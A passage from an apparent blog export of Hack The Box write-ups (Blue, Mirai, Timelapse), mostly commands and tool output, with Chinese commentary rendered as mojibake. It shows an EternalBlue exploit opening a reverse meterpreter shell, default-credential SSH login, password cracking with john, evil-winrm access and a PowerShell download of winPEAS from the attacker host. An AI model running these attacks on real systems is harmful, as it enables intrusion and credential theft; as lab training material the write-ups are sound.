/usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 10.10.10.40 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit [+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed ç¡®è®¤å­˜åœ¨ æ¼æ´åˆ©ç”¨Metasploitmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.40 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] 10.10.10.40:445 - Executing automatic check (disable AutoCheck to override) [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.10.10.40:445 - The target is vulnerable. [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.10.40:445 - Connecting to target for exploitation. [+] 10.10.10.40:445 - Connection established for exploitation. [+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes) [*] 10.10.10.40:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.10.40:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.10.40:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet [*] 10.10.10.40:445 - Starting non-paged pool grooming [+] 10.10.10.40:445 - Sending SMBv2 buffers [+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.10.40:445 - Sending final SMBv2 buffers. [*] 10.10.10.40:445 - Sending last fragment of exploit packet! [*] 10.10.10.40:445 - Receiving response from exploit packet [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.10.40:445 - Sending egg to corrupted connection. [*] 10.10.10.40:445 - Triggering free of corrupted buffer. [*] Sending stage (200262 bytes) to 10.10.10.40 [*] Meterpreter session 1 opened (10.10.16.4:4444 -&gt; 10.10.10.40:49158) at 2022-03-30 00:34:57 -0400 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM åˆ©ç”¨æˆåŠŸ meterpreter &gt; search -f user.txt Found 1 result... c:\\Users\\haris\\Desktop\\user.txt (34 bytes) meterpreter &gt; search -f root.txt Found 1 result... c:\\Users\\Administrator\\Desktop\\root.txt (34 bytes) meterpreter &gt; cat &#39;c:\\Users\\haris\\Desktop\\user.txt&#39; cf2da488a16cd6551e8813a3f3b2ad0a meterpreter &gt; cat &#39;c:\\Users\\Administrator\\Desktop\\root.txt&#39; 36bf758af3a68b38f132c2e4b2bc4531 æˆåŠŸæ‹¿åˆ° user æƒé™å’Œ root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Mirai - Hackthebox","slug":"Hackthebox - Mirai","date":"2022-04-02T11:38:36.000Z","updated":"2023-05-20T01:59:29.000Z","comments":true,"path":"2022/04/02/Hackthebox - Mirai/","link":"","permalink":"http://www.lucifiel.com/2022/04/02/Hackthebox%20-%20Mirai/","excerpt":"","text":"Hackthebox - Miraié¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Mirai] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.48 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:47 EDT Nmap scan report for 10.10.10.48 Host is up (7.9s latency). Not shown: 63987 filtered ports, 1545 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA) | 2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA) | 256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA) |_ 256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519) 53/tcp open tcpwrapped | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open tcpwrapped |_http-server-header: lighttpd/1.4.35 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). Device type: firewall Running (JUST GUESSING): Fortinet embedded (87%) OS CPE: cpe:/h:fortinet:fortigate_100d Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%) No exact OS matches for host (test conditions non-ideal). TRACEROUTE (using port 587/tcp) HOP RTT ADDRESS 1 ... 30 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 226.95 seconds Http ç›´æ¥è®¿é—®å‘ç°æ‰¾ä¸åˆ°ç½‘é¡µï¼Œè”æƒ³åˆ°æœ‰ 53 ç«¯å£ï¼Œåšä¸€ä¸ªæœ¬åœ° DNS è§£æã€‚ echo 10.10.10.48 mirai.htb &gt;&gt; /etc/hosts ç„¶åå»è®¿é—® mirai.htb è¯¥ç½‘ç«™ä¼¼ä¹å¼€å¯äº†ç™½åå•éªŒè¯æœºåˆ¶ï¼Œå’±ä»¬æŠ“ä¸ªåŒ…çœ‹çœ‹ ä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå»çœ‹çœ‹æ˜¯å¦æœ‰å¯åˆ©ç”¨çš„æ¼æ´å§ Fuzzå» fuzz ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰å¯ç”¨çš„æ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://mirai.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -fw 400 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://mirai.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 400 ________________________________________________ admin [Status: 301, Size: 0, Words: 1, Lines: 1] æœ‰ä¸€ä¸ª admin ç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹ ä¼¼ä¹æ˜¯ä¸€ä¸ªæ ‘è“æ´¾çš„ç•Œé¢ï¼Œå»ç™»å½•è¯•è¯• ç™»å½•å¤±è´¥ï¼Œç»è¿‡æœç´¢åå‘ç°ï¼Œæ ‘è“æ´¾æ˜¯æ²¡æœ‰é»˜è®¤å¯†ç çš„ï¼Œå…¨æ˜¯éšæœºå¯†ç  ä½†åŒæ—¶ä¹ŸçŸ¥é“äº†æ ‘è“æ´¾çš„é»˜è®¤ ssh å¯†ç  username = pi password = raspberry å»ç™»å½•ä¸€ä¸‹ æ¼æ´åˆ©ç”¨â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh pi@10.10.10.48 The authenticity of host &#39;10.10.10.48 (10.10.10.48)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.48&#39; (ECDSA) to the list of known hosts. pi@10.10.10.48&#39;s password: The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Aug 27 14:47:50 2017 from localhost SSH is enabled and the default password for the &#39;pi&#39; user has not been changed. This is a security risk - please login as the &#39;pi&#39; user and type &#39;passwd&#39; to set a new password. SSH is enabled and the default password for the &#39;pi&#39; user has not been changed. This is a security risk - please login as the &#39;pi&#39; user and type &#39;passwd&#39; to set a new password. pi@raspberrypi:~ $ whoami&amp;&amp;id pi uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi) æˆåŠŸè·å¾—ä¸€ä¸ª user æƒé™ pi@raspberrypi:~/Desktop $ cat user.txt ff837707441b257a20e32199d7c8838d æˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡pi@raspberrypi:~/Desktop $ sudo -l Matching Defaults entries for pi on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User pi may run the following commands on localhost: (ALL : ALL) ALL (ALL) NOPASSWD: ALL ä½¿ç”¨ sudo -l æŸ¥çœ‹ä¸€ä¸‹å½“å‰ sudo æƒé™ï¼Œå‘ç°æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œé‚£ç›´æ¥ææƒå§ pi@raspberrypi:~/Desktop $ sudo su root@raspberrypi:/home/pi/Desktop# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸè·å¾— root æƒé™ root@raspberrypi:~# cat root.txt I lost my original root.txt! I think I may have a backup on my USB stick... æˆåŠŸè·ã€‚ã€‚ã€‚å—¯ï¼Ÿä¸å¤ªå¯¹ï¼Œroot æƒé™çš„ flag æ–‡ä»¶ä¸¢å¤±ï¼Œä½†æ˜¯æç¤ºå¯èƒ½åœ¨ U ç›˜é‡Œæœ‰å¤‡ä»½ root@raspberrypi:/# mount sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime) proc on /proc type proc (rw,nosuid,nodev,noexec,relatime) tmpfs on /run type tmpfs (rw,nosuid,relatime,size=102396k,mode=755) /dev/sda1 on /lib/live/mount/persistence/sda1 type iso9660 (ro,noatime) /dev/loop0 on /lib/live/mount/rootfs/filesystem.squashfs type squashfs (ro,noatime) tmpfs on /lib/live/mount/overlay type tmpfs (rw,relatime) /dev/sda2 on /lib/live/mount/persistence/sda2 type ext4 (rw,noatime,data=ordered) aufs on / type aufs (rw,noatime,si=795e312f,noxino) devtmpfs on /dev type devtmpfs (rw,nosuid,size=10240k,nr_inodes=58955,mode=755) securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime) tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev) devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000) tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k) tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755) cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd) pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime) cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset) cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct) cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices) cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer) cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio) cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio) cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event) systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct) hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime) mqueue on /dev/mqueue type mqueue (rw,relatime) debugfs on /sys/kernel/debug type debugfs (rw,relatime) tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime) /dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered) tmpfs on /run/user/999 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=999,gid=997) tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=1000,gid=1000) ä½¿ç”¨ mount æŸ¥çœ‹ä¸€ä¸‹æŒ‚è½½äº†å“ªäº›å¤–éƒ¨é©±åŠ¨å™¨ æˆ‘ä»¬æŠŠçœ¼å…‰æ”¾åœ¨å€’æ•°ç¬¬ä¸‰è¡Œä¸Š /dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered) &#x2F;media&#x2F;usbstick åº”è¯¥å°±æ˜¯äº†ï¼Œå»çœ‹çœ‹ root@raspberrypi:/# cd /media/usbstick root@raspberrypi:/media/usbstick# ls -la total 18 drwxr-xr-x 3 root root 1024 Aug 14 2017 . drwxr-xr-x 3 root root 4096 Aug 14 2017 .. -rw-r--r-- 1 root root 129 Aug 14 2017 damnit.txt drwx------ 2 root root 12288 Aug 14 2017 lost+found è¿™é‡Œæœ‰ä¸€ä¸ª damnit.txt æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ root@raspberrypi:/media/usbstick# cat damnit.txt Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James è¿™åˆæ˜¯å˜›ç©æ„å„¿ James ä¸å°å¿ƒæŠŠæˆ‘ä»¬ U ç›˜çš„æ–‡ä»¶ç»™åˆ äº†ï¼Ÿä½ æè¿™è·Ÿæˆ‘å¥—å¨ƒå‘¢ï¼Ÿ æˆ‘ä»¬åº”è¯¥æ˜¯åœ¨ &#x2F;dev&#x2F;sdb åˆ†åŒºä¸Šï¼Œä½¿ç”¨ strings å‘½ä»¤åˆ—å‡ºä»¥å‰åœ¨ &#x2F;dev&#x2F;sdb åˆ†åŒºä¸Šæ‰§è¡Œè¿‡çš„å‘½ä»¤ root@raspberrypi:/media/usbstick# strings /dev/sdb &gt;r &amp; /media/usbstick lost+found root.txt damnit.txt &gt;r &amp; &gt;r &amp; /media/usbstick lost+found root.txt damnit.txt &gt;r &amp; /media/usbstick 2]8^ lost+found root.txt damnit.txt &gt;r &amp; 3d3e483143ff12ec505d026fa13e020b Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James è¡Œå§ï¼Œä»¥å‰æŸ¥çœ‹è¿‡æˆ‘ä»¬çš„ flag æ–‡ä»¶ï¼Œä¹Ÿç®—æ˜¯æ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶å§","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Timelapse - Hackthebox","slug":"Hackthebox - Timelapse","date":"2022-04-01T11:38:36.000Z","updated":"2023-05-20T03:17:33.000Z","comments":true,"path":"2022/04/01/Hackthebox - Timelapse/","link":"","permalink":"http://www.lucifiel.com/2022/04/01/Hackthebox%20-%20Timelapse/","excerpt":"","text":"Hackthebox - Timelapseé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.152 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-29 02:18 EDT Nmap scan report for 10.10.11.152 Host is up (0.55s latency). Not shown: 65525 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-29 14:19:01Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 |_ssl-date: 2022-03-29T14:21:28+00:00; +7h59m58s from scanner time. | tls-alpn: |_ http/1.1 9389/tcp open mc-nmf .NET Message Framing 49674/tcp open msrpc Microsoft Windows RPC 51354/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2022-03-29T14:20:18 |_ start_date: N/A TRACEROUTE (using port 135/tcp) HOP RTT ADDRESS 1 556.15 ms 10.10.16.1 2 556.22 ms 10.10.11.152 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 196.57 seconds Smbè¿™å°æœºå™¨æ˜æ˜¾æœ‰ smbï¼Œå…ˆå»æ‰¾ä¸€ä¸‹ guest ç”¨æˆ·çš„ç¥¨æ® enum4linux -a -u &quot;guset&quot; -p &quot;&quot; 10.10.11.152 [+] Attempting to map shares on 10.10.11.152 Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/ADMIN$ Mapping: DENIED, Listing: N/A Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/C$ Mapping: DENIED, Listing: N/A Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/IPC$ [E] Can&#39;t understand response: NT_STATUS_INVALID_INFO_CLASS listing \\* Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/NETLOGON Mapping: OK Listing: DENIED Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/Shares Mapping: OK, Listing: OK Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654. //10.10.11.152/SYSVOL Mapping: OK Listing: DENIED è¯¥ Shares æ–‡ä»¶å¤¹å¯ä¾›é˜…è¯»ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹é‡Œé¢æœ‰äº›ä»€ä¹ˆ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# smbclient -U &quot;guest&quot; //10.10.11.152/Shares Enter WORKGROUP\\guest&#39;s password: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; dir . D 0 Mon Oct 25 11:39:15 2021 .. D 0 Mon Oct 25 11:39:15 2021 Dev D 0 Mon Oct 25 15:40:06 2021 HelpDesk D 0 Mon Oct 25 11:48:42 2021 6367231 blocks of size 4096. 2323752 blocks available æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œå»æŒ¨ä¸ªæŸ¥è¯¢ä¸€ä¸‹ smb: \\&gt; cd Dev smb: \\Dev\\&gt; dir . D 0 Mon Oct 25 15:40:06 2021 .. D 0 Mon Oct 25 15:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 11:46:42 2021 6367231 blocks of size 4096. 2323752 blocks available Dev ç›®å½•ä¸‹æœ‰ä¸€ä¸ª winrm_backup.zip å‹ç¼©æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹ smb: \\Dev\\&gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec) Johnä¸‹è½½ä¸‹æ¥äº†ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: éœ€è¦è§£å‹å¯†ç ï¼Œå’±ä»¬æ²¡æœ‰å•Šï¼Œä½¿ç”¨ john å°è¯•çˆ†ç ´ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# zip2john winrm_backup.zip &gt; hash ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:00 DONE (2022-03-29 21:46) 3.333g/s 11578Kp/s 11578Kc/s 11578KC/s surfroxy154..supergay01 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed è§£å‹å¯†ç æ˜¯ supremelegacy å»è§£å‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: inflating: legacyy_dev_auth.pfx æ¼æ´åˆ©ç”¨è§£å‹å‡ºæ¥åæœ‰ä¸€ä¸ª pfx æ–‡ä»¶ï¼ŒæŸ¥è¯¢äº†ä¸€ä¸‹ pfx å¯ä»¥ä½¿ç”¨ openssl æå–å‡ºç§é’¥ï¼Œå»æå–ä¸€ä¸‹ https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key Enter Import Password: Mac verify error: invalid password? æå–æ—¶å‘ç°ä¹Ÿéœ€è¦å¯†ç ï¼Œä½¿ç”¨åˆšæ‰ zip çˆ†ç ´å‡ºæ¥çš„å¯†ç å°è¯•å¤±è´¥ï¼Œå†å»çˆ†ç ´ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# pfx2john legacyy_dev_auth.pfx &gt; hashbis â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hashbis Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:01:58 DONE (2022-03-29 21:53) 0.008414g/s 27189p/s 27189c/s 27189C/s thuglife06..thug211 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. çˆ†ç ´å‡ºæ¥å¯†ç  thuglegacyï¼Œç„¶åå†å»æå–ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out prv.key Enter Import Password: Enter PEM pass phrase: Verifying - Enter PEM pass phrase: â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt Enter Import Password: â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# ls cert.crt hash hashbis legacyy_dev_auth.pfx nmap prv.key winrm_backup.zip ä½¿ç”¨ evil-winrm è¿›è¡Œåˆ©ç”¨ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint Enter PEM pass phrase: *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoami timelapse\\legacyy æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™ *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; type &#39;C:\\Users\\legacyy\\Desktop\\user.txt&#39; 622218eb92f1c85ad186d6aee0dbdb53 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ä½¿ç”¨ powershell ä¸‹è½½æˆ‘ä»¬æœ¬åœ°çš„ winPEAS.exe è¾…åŠ©ææƒè„šæœ¬ powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe&quot; ç„¶åè¿è¡Œ *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe&quot; *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; ./winPEASx64.exe Ã‰ÃÃÃÃÃÃÃÃÃÃÂ¹ PowerShell Settings PowerShell v2 Version: 2.0 PowerShell v5 Version: 5.1.17763.1 PowerShell Core Version: Transcription Settings: Module Logging Settings: Scriptblock Logging Settings: PS history file: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt PS history size: 434B å‘ç°äº†ä¸€ä¸ªåŒ…å«å†å²å‘½ä»¤è®°å½•çš„æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ download C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt ç„¶åæŸ¥çœ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# cat ConsoleHost_history.txt whoami ipconfig /all netstat -ano |select-string 